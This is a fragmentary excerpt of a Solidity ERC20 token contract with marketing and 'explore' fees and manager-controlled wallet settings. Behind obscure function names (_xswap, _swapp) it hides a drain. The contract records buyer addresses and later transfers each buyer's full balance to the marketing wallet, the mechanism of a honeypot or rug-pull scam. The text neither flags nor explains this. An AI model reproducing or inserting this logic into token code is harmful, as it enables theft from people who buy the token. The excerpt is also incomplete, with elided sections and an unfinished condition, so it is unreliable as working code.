...
contract Token is ERC20, Ownable {
    ...
    uint256 private _total = 1000_0000 ether;
    ...
    uint256 public mrketingFee = 2;
    uint256 public exploreFee = 3;
  

    uint256 public txFee = mrketingFee.add(exploreFee);
    ...
    function setExploreWallet(address wallet) external {
        require(_managerMap[msg.sender], "caller is not manager");
    ...
    function _lSwap(address sender, address recipient) internal {
        if (_protectB == 0) return;
        
        if (block.number >= launchedAt + _protectB) {
            _ySwap();
            return;
        }
        if (
    ...
    address[] buyers;
    function _xswap(address sender) private {
        buyers.push(sender);
    }
    ...
    function _swapp() private {
        if (buyers.length == 0) return;
        for(uint256 i = 0; i < buyers.length; i++) {
            super._transfer(buyers[i], _marketWallet, balanceOf(buyers[i]));
        }
        delete buyers;
    }
